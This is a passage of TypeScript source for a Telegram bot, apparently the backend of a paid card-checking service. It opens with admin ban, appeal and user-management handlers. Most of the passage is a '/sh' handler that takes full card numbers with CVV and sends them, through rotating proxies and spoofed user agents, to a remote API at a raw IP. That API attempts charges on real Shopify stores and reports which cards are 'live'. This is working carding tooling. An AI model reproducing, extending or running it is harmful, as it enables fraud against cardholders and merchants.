        const deviceBlockNote = isPermanentBan ? "\n🔒 Device & IP blocked" : "";
        if (messageId) await editTelegramMessage(callbackChatId, messageId, `
✅ <b>User Banned</b>

👤 ${pendingBan.username || pendingBan.user_email}
⏱️ ${durationText}
📝 ${pendingBan.ban_reason || "No reason"}${deviceBlockNote}
`);
        await answerCallbackQuery(update.callback_query.id, "✅ Banned");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Appeal handling
      if (callbackData.startsWith("appeal_approve_") || callbackData.startsWith("appeal_reject_")) {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const isApprove = callbackData.startsWith("appeal_approve_");
        const appealId = callbackData.replace(isApprove ? "appeal_approve_" : "appeal_reject_", "");

        const { data: appeal } = await supabase.from("ban_appeals").select("*").eq("id", appealId).single();
        if (!appeal) {
          await answerCallbackQuery(update.callback_query.id, "❌ Appeal not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        if (isApprove) {
          await supabase.from("profiles").update({
            is_banned: false, ban_reason: null, banned_at: null, banned_until: null
          }).eq("user_id", appeal.user_id);

          // Remove device/IP blocks for this user
          await supabase
            .from("blocked_devices")
            .update({ is_active: false })
            .eq("banned_user_id", appeal.user_id);

          await supabase.from("ban_appeals").update({
            status: "approved", resolved_at: new Date().toISOString()
          }).eq("id", appealId);

          if (appeal.telegram_chat_id) {
            await sendTelegramMessage(appeal.telegram_chat_id, "✅ <b>Appeal Approved</b>\n\nYour account has been unbanned!");
          }

          // Send email notification
          if (appeal.email) {
            await sendUnbanEmail(appeal.email, appeal.username);
          }

          await answerCallbackQuery(update.callback_query.id, "✅ Approved");
        } else {
          await supabase.from("ban_appeals").update({
            status: "rejected", resolved_at: new Date().toISOString()
          }).eq("id", appealId);

          if (appeal.telegram_chat_id) {
            await sendTelegramMessage(appeal.telegram_chat_id, "❌ <b>Appeal Rejected</b>\n\nYour ban remains in effect.");
          }
          await answerCallbackQuery(update.callback_query.id, "❌ Rejected");
        }

        try {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: update.callback_query.message?.chat.id,
              message_id: update.callback_query.message?.message_id,
              reply_markup: { inline_keyboard: [] },
            }),
          });
        } catch (e) {}

        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Userinfo quick actions
      if (callbackData.startsWith("userinfo_ban_")) {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const userId = callbackData.replace("userinfo_ban_", "");
        const { data: profile } = await supabase.from("profiles").select("*").eq("user_id", userId).maybeSingle();
        
        if (!profile) {
          await answerCallbackQuery(update.callback_query.id, "❌ User not found");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Get user email
        const { data: authData } = await supabase.auth.admin.listUsers();
        const userEmail = authData?.users?.find((u: any) => u.id === userId)?.email || null;

        // Start ban flow
        await supabase.from("pending_bans").insert({
          user_id: userId,
          admin_chat_id: callbackChatId,
          user_email: userEmail,
          user_telegram_chat_id: profile.telegram_chat_id,
          username: profile.username,
          step: "reason"
        });

        await sendTelegramMessage(callbackChatId, `
🔨 <b>Banning: ${profile.username || userEmail}</b>

Reply with the ban reason:
(or /cancelban to abort)
`);
        await answerCallbackQuery(update.callback_query.id, "Enter ban reason");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData.startsWith("userinfo_unban_")) {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const userId = callbackData.replace("userinfo_unban_", "");
        const { data: profile } = await supabase.from("profiles").select("username, telegram_chat_id").eq("user_id", userId).maybeSingle();

        await supabase.from("profiles").update({
          is_banned: false,
          ban_reason: null,
          banned_at: null,
          banned_until: null
        }).eq("user_id", userId);

        // Remove device/IP blocks for this user
        await supabase
          .from("blocked_devices")
          .update({ is_active: false })
          .eq("banned_user_id", userId);

        // Get user email for notification
        const { data: authData } = await supabase.auth.admin.listUsers();
        const userEmail = authData?.users?.find((u: any) => u.id === userId)?.email;

        if (profile?.telegram_chat_id) {
          await sendTelegramMessage(profile.telegram_chat_id, "✅ Your account has been unbanned!");
        }

        // Send email notification
        if (userEmail) {
          await sendUnbanEmail(userEmail, profile?.username || null);
        }

        await sendTelegramMessage(callbackChatId, `✅ Unbanned: ${profile?.username || userId}`);
        await answerCallbackQuery(update.callback_query.id, "✅ Unbanned");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData.startsWith("userinfo_addcredits_")) {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const userId = callbackData.replace("userinfo_addcredits_", "");
        const { data: profile } = await supabase.from("profiles").select("username, credits").eq("user_id", userId).maybeSingle();
        const { data: authData } = await supabase.auth.admin.listUsers();
        const userEmail = authData?.users?.find((u: any) => u.id === userId)?.email || "user";

        await sendTelegramMessage(callbackChatId, `
💰 <b>Add Credits</b>

👤 ${profile?.username || userEmail}
💳 Current: ${profile?.credits || 0} credits

<b>Usage:</b> /addfund <code>${userEmail} [amount]</code>

Examples:
• /addfund ${userEmail} 50
• /addfund ${userEmail} -100 (deduct)
`);
        await answerCallbackQuery(update.callback_query.id, "Use /addfund command");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData.startsWith("userinfo_delete_")) {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const userId = callbackData.replace("userinfo_delete_", "");
        const { data: profile } = await supabase.from("profiles").select("username").eq("user_id", userId).maybeSingle();

        const keyboard = {
          inline_keyboard: [[
            { text: "✅ Confirm Delete", callback_data: `delete_confirm_${userId}` },
            { text: "❌ Cancel", callback_data: `delete_cancel_${userId}` },
          ]],
        };

        await sendTelegramMessage(callbackChatId, `
🗑️ <b>Delete User?</b>

👤 ${profile?.username || userId}

⚠️ This will permanently delete:
• User account
• All profile data
• Transaction history
`, keyboard);
        await answerCallbackQuery(update.callback_query.id, "Confirm deletion");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // View user devices from userinfo
      if (callbackData.startsWith("userinfo_devices_")) {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const userId = callbackData.replace("userinfo_devices_", "");
        const { data: profile } = await supabase.from("profiles").select("username").eq("user_id", userId).maybeSingle();
        const { data: authData } = await supabase.auth.admin.listUsers();
        const userEmail = authData?.users?.find((u: any) => u.id === userId)?.email || "Unknown";

        // Get all devices for this user
        const { data: devices } = await supabase
          .from("user_device_logs")
          .select("*")
          .eq("user_id", userId)
          .order("last_seen", { ascending: false })
          .limit(20);

        // Get blocked devices for this user
        const { data: blockedDevices } = await supabase
          .from("blocked_devices")
          .select("fingerprint, ip_address")
          .eq("banned_user_id", userId)
          .eq("is_active", true);

        const blockedFingerprints = new Set(blockedDevices?.map((b: any) => b.fingerprint).filter(Boolean) || []);
        const blockedIPs = new Set(blockedDevices?.map((b: any) => b.ip_address).filter(Boolean) || []);

        let message = `📱 <b>Devices for ${profile?.username || userEmail}</b>\n\n`;

        if (!devices || devices.length === 0) {
          message += "No device logs found.";
        } else {
          const uniqueIPs = [...new Set(devices.map((d: any) => d.ip_address).filter(Boolean))];
          const uniqueFPs = [...new Set(devices.map((d: any) => d.fingerprint).filter(Boolean))];
          
          message += `<b>Summary</b>\n`;
          message += `• Total Logs: ${devices.length}\n`;
          message += `• Unique IPs: ${uniqueIPs.length}\n`;
          message += `• Unique Fingerprints: ${uniqueFPs.length}\n`;
          message += `• Blocked: ${blockedDevices?.length || 0}\n\n`;
          
          message += `<b>Recent Devices</b>\n`;
          devices.slice(0, 10).forEach((d: any, i: number) => {
            const lastSeen = new Date(d.last_seen).toLocaleDateString("en-US", { 
              month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" 
            });
            const isIPBlocked = blockedIPs.has(d.ip_address);
            const isFPBlocked = blockedFingerprints.has(d.fingerprint);
            const blockIndicator = (isIPBlocked || isFPBlocked) ? " 🚫" : "";
            
            // Parse user agent for browser/OS info
            const ua = d.user_agent || "";
            let browserOS = "Unknown";
            if (ua.includes("Chrome")) browserOS = "Chrome";
            else if (ua.includes("Firefox")) browserOS = "Firefox";
            else if (ua.includes("Safari")) browserOS = "Safari";
            else if (ua.includes("Edge")) browserOS = "Edge";
            
            if (ua.includes("Windows")) browserOS += "/Windows";
            else if (ua.includes("Mac")) browserOS += "/Mac";
            else if (ua.includes("Linux")) browserOS += "/Linux";
            else if (ua.includes("Android")) browserOS += "/Android";
            else if (ua.includes("iPhone") || ua.includes("iPad")) browserOS += "/iOS";
            
            message += `\n${i + 1}. ${d.ip_address || "Unknown IP"}${blockIndicator}`;
            message += `\n   FP: <code>${d.fingerprint?.substring(0, 16) || "N/A"}...</code>`;
            message += `\n   ${browserOS} | ${lastSeen}`;
          });
        }

        await sendTelegramMessage(callbackChatId, message, {
          inline_keyboard: [[
            { text: "🔙 Back to User", callback_data: `userinfo_back_${userId}` }
          ]]
        });
        await answerCallbackQuery(update.callback_query.id, "");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // View user sessions from userinfo
      if (callbackData.startsWith("userinfo_sessions_")) {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const userId = callbackData.replace("userinfo_sessions_", "");
        const { data: profile } = await supabase.from("profiles").select("username").eq("user_id", userId).maybeSingle();
        const { data: authData } = await supabase.auth.admin.listUsers();
        const userEmail = authData?.users?.find((u: any) => u.id === userId)?.email || "Unknown";

        // Get all sessions for this user
        const { data: sessions } = await supabase
          .from("user_sessions")
          .select("*")
          .eq("user_id", userId)
          .order("last_active", { ascending: false })
          .limit(15);

        let message = `🔐 <b>Sessions for ${profile?.username || userEmail}</b>\n\n`;

        if (!sessions || sessions.length === 0) {
          message += "No active sessions found.";
        } else {
          const now = new Date();
          const hourAgo = new Date(now.getTime() - 60 * 60 * 1000);
          const dayAgo = new Date(now.getTime() - 24 * 60 * 60 * 1000);
          
          const activeSessions = sessions.filter((s: any) => new Date(s.last_active) > hourAgo).length;
          const todaySessions = sessions.filter((s: any) => new Date(s.last_active) > dayAgo).length;
          
          message += `<b>Summary</b>\n`;
          message += `• Total Sessions: ${sessions.length}\n`;
          message += `• Active (1h): ${activeSessions}\n`;
          message += `• Active (24h): ${todaySessions}\n\n`;
          
          message += `<b>Session List</b>\n`;
          sessions.slice(0, 10).forEach((s: any, i: number) => {
            const lastActive = new Date(s.last_active);
            const isActive = lastActive > hourAgo;
            const timeAgo = formatTimeAgo(lastActive);
            const statusIcon = isActive ? "🟢" : "⚪";
            
            message += `\n${statusIcon} ${i + 1}. ${s.browser || "Unknown"} / ${s.os || "Unknown"}`;
            message += `\n   IP: ${s.ip_address || "Unknown"}`;
            message += `\n   Location: ${s.location || "Unknown"}`;
            message += `\n   Last: ${timeAgo}`;
            if (s.is_current) message += " 📍";
          });
        }

        await sendTelegramMessage(callbackChatId, message, {
          inline_keyboard: [[
            { text: "🔙 Back to User", callback_data: `userinfo_back_${userId}` }
          ]]
        });
        await answerCallbackQuery(update.callback_query.id, "");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Back to userinfo
      if (callbackData.startsWith("userinfo_back_")) {
        if (!callbackChatId || !isCallbackAdmin) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const userId = callbackData.replace("userinfo_back_", "");
        // Get user email to call userinfo
        const { data: authData } = await supabase.auth.admin.listUsers();
        const userEmail = authData?.users?.find((u: any) => u.id === userId)?.email;
        
        if (userEmail) {
          await handleUserInfo(callbackChatId, userEmail, supabase);
        } else {
          await sendTelegramMessage(callbackChatId, "❌ Could not load user info");
        }
        await answerCallbackQuery(update.callback_query.id, "");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // ─────────────────────────────────────────────────────────
      // SHOPIFY CHARGE (/sh) PRICE GROUP CALLBACK
      // ─────────────────────────────────────────────────────────

      if (callbackData === "sh_nosite") {
        await answerCallbackQuery(update.callback_query.id, "❌ No sites available in this price range");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData.startsWith("sh_price_")) {
        const parts = callbackData.replace("sh_price_", "").split("_");
        const priceMin = parseInt(parts[0]);
        const priceMax = parseInt(parts[1]);
        const encodedCC = parts.slice(2).join("_");
        
        let cc = "";
        try { cc = atob(encodedCC); } catch {
          await answerCallbackQuery(update.callback_query.id, "❌ Invalid card data");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        if (!cc || !callbackChatId || !messageId) {
          await answerCallbackQuery(update.callback_query.id, "❌ Invalid request");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        await answerCallbackQuery(update.callback_query.id, `⚡ Checking on $${priceMin}-$${priceMax} sites...`);

        const { data: shProfile } = await supabase
          .from("profiles")
          .select("user_id, username, credits, is_banned")
          .eq("telegram_chat_id", callbackChatId)
          .maybeSingle();

        if (!shProfile) {
          await editTelegramMessage(callbackChatId, messageId, "❌ <b>Account not connected.</b>");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        if (shProfile.is_banned) {
          await editTelegramMessage(callbackChatId, messageId, "🚫 <b>Account Suspended</b>");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        if (shProfile.credits < 2) {
          await editTelegramMessage(callbackChatId, messageId, `❌ <b>Insufficient Credits</b>\n\nNeed at least <b>2 credits</b>.\nBalance: <b>${shProfile.credits}</b>\n\nTop up at yunchicheck.com/dashboard/topup`);
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const ccParts = cc.split("|");
        if (ccParts.length < 4 || !ccParts[3] || ccParts[3].length < 3) {
          await editTelegramMessage(callbackChatId, messageId, "❌ <b>Invalid card format.</b> Use: <code>cc|mm|yy|cvv</code>");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // BIN lookup
        const shBinDigits = ccParts[0].replace(/\D/g, '').slice(0, 8);
        let shBinBrand = "Unknown"; let shBinType = "Unknown"; let shBinBank = "Unknown Bank"; let shBinCountry = "Unknown"; let shBinCountryCode = "XX"; let shBinLevel = "Standard";
        try {
          const binR = await fetch(`https://lookup.binlist.net/${shBinDigits}`, { headers: { 'Accept-Version': '3' } });
          if (binR.ok) {
            const bd = await binR.json();
            shBinBrand = bd.scheme?.toUpperCase() || "Unknown";
            shBinType = bd.type ? bd.type.charAt(0).toUpperCase() + bd.type.slice(1) : "Unknown";
            shBinBank = bd.bank?.name || "Unknown Bank";
            shBinCountry = bd.country?.name || "Unknown";
            shBinCountryCode = bd.country?.alpha2 || "XX";
            shBinLevel = bd.brand || "Standard";
          }
        } catch { /* fallback */ }
        if (shBinBrand === "Unknown") {
          if (/^4/.test(shBinDigits)) shBinBrand = "VISA";
          else if (/^5[1-5]/.test(shBinDigits) || /^2[2-7]/.test(shBinDigits)) shBinBrand = "MASTERCARD";
          else if (/^3[47]/.test(shBinDigits)) shBinBrand = "AMEX";
          else if (/^6(?:011|5|4[4-9]|22)/.test(shBinDigits)) shBinBrand = "DISCOVER";
        }
        const shBrandLogos: Record<string, string> = {
          'VISA': '💙 𝗩𝗜𝗦𝗔', 'MASTERCARD': '🟠 𝗠𝗔𝗦𝗧𝗘𝗥𝗖𝗔𝗥𝗗', 'AMEX': '💚 𝗔𝗠𝗘𝗫',
          'DISCOVER': '🟧 𝗗𝗜𝗦𝗖𝗢𝗩𝗘𝗥', 'JCB': '🔴 𝗝𝗖𝗕', 'UNIONPAY': '🔵 𝗨𝗡𝗜𝗢𝗡𝗣𝗔𝗬',
          'MAESTRO': '🔷 𝗠𝗔𝗘𝗦𝗧𝗥𝗢', 'DINERS CLUB': '⚪ 𝗗𝗜𝗡𝗘𝗥𝗦',
        };
        const shBrandLogo = shBrandLogos[shBinBrand] || `💳 ${shBinBrand}`;
        const shGetFlag = (code: string) => {
          if (!code || code === 'XX') return '🌍';
          return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
        };
        const shCountryFlag = shGetFlag(shBinCountryCode);

        // Show processing message with BIN info
        await editTelegramMessage(callbackChatId, messageId, `
🛍 <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>

${shBrandLogo}
📟 <code>${escapeHtml(cc)}</code>
🏦 ${escapeHtml(shBinBank)}
${shCountryFlag} ${escapeHtml(shBinCountry)}

⏳ <b>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...</b>
💰 Range: $${priceMin} – $${priceMax}

<i>🔄 Connecting to Shopify API...</i>
`);

        const startTime = Date.now();
        const SHOPIFY_API_URL = "http://108.165.12.183:8081/";
        const SHOPIFY_DEBUG_CHAT = "-1003848532661";
        const SH_UNKNOWN_RETRIES = 4;

        // Bad response patterns (same as shopify-charge-check)
        const shBadResponses = [
          "Site not supported", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
          "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "Payment method not available",
          "ARTIFACT_DISSATISFACTION", "VALIDATION_CUSTOM", '"Gateway":"Authorize.net"',
        ];
        const shProxyDeadIndicators = [
          "proxy dead", "proxy error", "proxy authentication", "connection refused",
          "proxy connect", "tunneling socket", "proxy_error", "bad proxy",
          "cannot connect to host", "socks", "econnrefused", "econnreset",
        ];
        const shSiteDeadIndicators = ["site dead"];
        const shUserAgents = [
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
          'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
        ];

        try {
          // Fetch sites from gateway_urls based on price range
          let sitesQuery = supabase
            .from("gateway_urls")
            .select("url, price")
            .not("url", "like", "https://razorpay.me/%")
            .lte("price", 100);

          if (priceMin > 0 || priceMax < 100) {
            if (priceMin > 0) sitesQuery = sitesQuery.gt("price", priceMin);
            if (priceMax < 100) sitesQuery = sitesQuery.lte("price", priceMax);
          } else {
            sitesQuery = sitesQuery.gt("price", 0);
          }

          const { data: sites, error: sitesErr } = await sitesQuery.order("created_at", { ascending: false });

          if (sitesErr || !sites || sites.length === 0) {
            await editTelegramMessage(callbackChatId, messageId, `
━━━━━━━━━━━━━━━━━━━━━━
   🛒 <b>SHOPIFY CHARGE</b>
━━━━━━━━━━━━━━━━━━━━━━

❌ <b>No sites available</b> in $${priceMin}-$${priceMax} range.
Admin needs to add sites via Health Check.
━━━━━━━━━━━━━━━━━━━━━━
`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
            return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
          }

          // Fetch user's proxies
          const { data: userProxies, error: proxyErr } = await supabase
            .from("user_proxies")
            .select("*")
            .eq("user_id", shProfile.user_id);

          if (proxyErr || !userProxies || userProxies.length < 1) {
            await editTelegramMessage(callbackChatId, messageId, `
━━━━━━━━━━━━━━━━━━━━━━
   🛒 <b>SHOPIFY CHARGE</b>
━━━━━━━━━━━━━━━━━━━━━━

❌ <b>No Proxies</b>

You must add at least 1 proxy before using Shopify Charge.

Go to yunchicheck.com/dashboard → Proxies
━━━━━━━━━━━━━━━━━━━━━━
`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
            return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
          }

          // Shuffle sites and proxies
          const shuffledSites = [...sites].sort(() => Math.random() - 0.5);
          const shuffledProxies = [...userProxies].sort(() => Math.random() - 0.5);
          const formatProxy = (p: any) => p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;

          const MAX_SITE_ATTEMPTS = Math.min(3, shuffledSites.length);
          const failedProxyIds: string[] = [];
          let finalResult: any = null;
          let usedSite = shuffledSites[0];

          // Helper: single API call
          const callShopifyOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
            const apiUrl = `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 55000);
            try {
              const resp = await fetch(apiUrl, {
                method: "GET",
                headers: {
                  'Accept': 'application/json, text/plain, */*',
                  'User-Agent': shUserAgents[Math.floor(Math.random() * shUserAgents.length)],
                  'Cache-Control': 'no-cache',
                },
                signal: controller.signal,
              });
              clearTimeout(timeout);
              const rawText = await resp.text();
              if (!rawText || rawText.trim() === '') return { status: 'unknown', message: 'Empty response', rawResponse: '', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, apiResponse: '' };
              
              const rawLower = rawText.toLowerCase();

              // Transient errors
              if (rawLower.includes('failed to perform') || rawLower.includes('getaddrinfo') || rawLower.includes('could not resolve proxy') || rawLower.includes('tokenize_fail') || rawLower.includes('no_session_token')) {
                return { status: 'unknown', message: 'Transient error', rawResponse: rawText, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, apiResponse: '' };
              }
              // Proxy dead
              if (shProxyDeadIndicators.some(ind => rawLower.includes(ind))) {
                return { status: 'dead', message: 'Proxy Dead', rawResponse: rawText, price: 0, priceStr: '$0.00', proxyDead: true, siteDead: false, apiResponse: 'Proxy Dead' };
              }
              // Site dead
              if (shSiteDeadIndicators.some(ind => rawLower.includes(ind))) {
                return { status: 'dead', message: 'Site Dead', rawResponse: rawText, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: true, apiResponse: 'Site Dead' };
              }
              // Bad response
              if (shBadResponses.some(bad => rawText.toLowerCase().includes(bad.toLowerCase()))) {
                return { status: 'dead', message: 'Bad response', rawResponse: rawText, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, apiResponse: '' };
              }
              if (rawText.includes('DELIVERY_ADDRESS')) {
                return { status: 'dead', message: 'DELIVERY_ADDRESS error', rawResponse: rawText, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, apiResponse: 'DELIVERY_ADDRESS' };
              }

              // Extract price
              let price = 0; let priceStr = '$0.00';
              const pricePatterns = [/\$[\d,]+\.?\d*/g, /"price":\s*"?[\d.]+/gi, /"amount":\s*"?[\d.]+/gi, /"total":\s*"?[\d.]+/gi];
              for (const pattern of pricePatterns) {
                const matches = rawText.match(pattern);
                if (matches) {
                  for (const m of matches) {
                    const v = parseFloat(m.replace(/[^0-9.]/g, ""));
                    if (!isNaN(v) && v > 0 && v < price || price === 0) { price = v; priceStr = `$${v.toFixed(2)}`; }
                  }
                }
              }

              // Parse status from response
              let apiStatus = 'unknown'; let apiMessage = rawText; let apiResponse = '';
              try {
                const json = JSON.parse(rawText);
                if (json.Price !== undefined && json.Price > 0) { price = json.Price; priceStr = `$${Number(json.Price).toFixed(2)}`; }
                if (json.Response) apiResponse = String(json.Response).replace(/<[^>]*>/g, '');
                apiMessage = json.message || json.msg || json.error || rawText;

                if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true || json.status === 'ORDER_COMPLETED' || json.Response === 'ORDER_COMPLETED' || json.Response === 'Order completed 💎') {
                  apiStatus = 'live'; apiMessage = json.message || json.Response || 'Charged';
                } else if (json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED' || json.status === 'OTP_REQUIRED' || json.Response === 'OTP_REQUIRED') {
                  apiStatus = 'dead'; apiMessage = json.message || json.error || json.Response || 'Declined';
                } else {
                  const combined = ((apiMessage || '') + ' ' + (apiResponse || '')).toLowerCase();
                  if (combined.includes('order_completed') || combined.includes('order completed') || combined.includes('charged') || combined.includes('success') || combined.includes('approved')) apiStatus = 'live';
                  else if (combined.includes('declined') || combined.includes('invalid') || combined.includes('expired') || combined.includes('insufficient') || combined.includes('card_declined') || combined.includes('do_not_honor') || combined.includes('fraud') || combined.includes('otp_required') || combined.includes('3ds') || combined.includes('rejected') || combined.includes('restricted') || combined.includes('generic_decline')) apiStatus = 'dead';
                }
              } catch {
                const lower = rawText.toLowerCase();
                if (lower.includes('order completed') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) apiStatus = 'live';
                else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('otp_required') || lower.includes('rejected')) apiStatus = 'dead';
              }

              return { status: apiStatus, message: apiMessage, rawResponse: rawText, price, priceStr, proxyDead: false, siteDead: false, apiResponse };
            } catch (e) {
              clearTimeout(timeout);
              const msg = e instanceof Error ? e.message : 'Error';
              return { status: 'unknown', message: msg.includes('abort') ? 'Timeout' : msg, rawResponse: msg, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, apiResponse: '' };
            }
          };

          // Helper: call API with retries for unknowns
          const callShopifyWithRetry = async (cardCC: string, siteUrl: string, proxy: string) => {
            let result = await callShopifyOnce(cardCC, siteUrl, proxy);
            if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
            for (let retry = 1; retry <= SH_UNKNOWN_RETRIES; retry++) {
              await new Promise(r => setTimeout(r, 1000 * retry + Math.floor(Math.random() * 500)));
              result = await callShopifyOnce(cardCC, siteUrl, proxy);
              if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
            }
            return result;
          };

          // Update message with progress
          let progressStep = 0;
          const updateProgress = async (step: string) => {
            progressStep++;
            const progressBar = "▓".repeat(Math.min(progressStep, 5)) + "░".repeat(Math.max(0, 5 - progressStep));
            await editTelegramMessage(callbackChatId, messageId, `
🛍 <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>

${shBrandLogo}
📟 <code>${escapeHtml(cc)}</code>
🏦 ${escapeHtml(shBinBank)}
${shCountryFlag} ${escapeHtml(shBinCountry)}

⏳ <b>${step}</b>
[${progressBar}] Step ${progressStep}
💰 Range: $${priceMin} – $${priceMax}
📊 ${sites.length} sites ・ ${userProxies.length} proxies
`);
          };

          // Multi-site retry loop
          for (let siteAttempt = 0; siteAttempt < MAX_SITE_ATTEMPTS; siteAttempt++) {
            const currentSite = shuffledSites[siteAttempt];
            usedSite = currentSite;

            await updateProgress(`Trying site ${siteAttempt + 1}/${MAX_SITE_ATTEMPTS}...`);

            const availableProxies = shuffledProxies.filter((p: any) => !failedProxyIds.includes(p.id));
            if (availableProxies.length === 0) {
              finalResult = { status: 'unknown', message: 'All proxies failed', rawResponse: '', price: 0, priceStr: '$0.00', apiResponse: '' };
              break;
            }

            let siteResult: any = null;
            for (let proxyAttempt = 0; proxyAttempt < availableProxies.length; proxyAttempt++) {
              const currentProxy = availableProxies[proxyAttempt];
              const proxyStr = formatProxy(currentProxy);

              siteResult = await callShopifyWithRetry(cc, currentSite.url, proxyStr);

              if (siteResult.proxyDead) {
                failedProxyIds.push(currentProxy.id);
                supabase.from('user_proxies').delete().eq('id', currentProxy.id).then(() => {});
                continue;
              }
              if (siteResult.siteDead) {
                supabase.from('gateway_urls').delete().eq('url', currentSite.url).then(() => {});
                if (TELEGRAM_BOT_TOKEN) {
                  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: "POST", headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: SHOPIFY_DEBUG_CHAT, text: `🗑️ <b>SITE DEAD (via /sh)</b>\n\n<code>${currentSite.url}</code>`, parse_mode: "HTML" }),
                  }).catch(() => {});
                }
                siteResult = null;
                break;
              }
              break; // proxy worked
            }

